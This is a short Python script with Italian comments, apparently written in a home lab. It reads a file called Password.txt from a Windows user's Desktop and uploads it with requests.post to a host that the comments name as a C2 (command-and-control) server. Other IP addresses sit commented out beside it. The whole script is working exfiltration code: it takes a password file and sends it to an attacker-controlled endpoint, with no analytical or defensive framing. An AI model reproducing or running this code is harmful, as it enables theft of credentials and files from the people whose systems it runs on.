import os
import requests

# File da inviare
file_to_send = "C:\\Users\\rocco\\Desktop\\Password.txt"

# URL del server C2
#c2_url = "http://192.168.1.3:5000/upload"  # IP shell Mac

c2_url = "http://10.211.55.5:5000/upload" # IP shell Linux

def send_file(file_path):
    try:
        # Verifica che il file non sia vuoto prima di procedere
        with open(file_path, 'rb') as file:
            content = file.read()
            if not content:
                print(f"Il file {file_path} è vuoto!")
                return
            print(f"Contenuto letto (prima parte): {content[:100]}") 

        # Invia il file
        files = {'file': (os.path.basename(file_path), content)}
        response = requests.post(c2_url, files=files)
        if response.status_code == 200:
            print(f"File {file_path} inviato correttamente")
        else:
            print(f"Errore nell'invio del file {file_path}: {response.status_code} {response.text}")

    except Exception as e:
        print(f"Eccezione durante l'invio del file {file_path}: {e}")

# Controlla se il file esiste e invialo
if os.path.exists(file_to_send):
    send_file(file_to_send)
else:
    print(f"Il file {file_to_send} non esiste.")
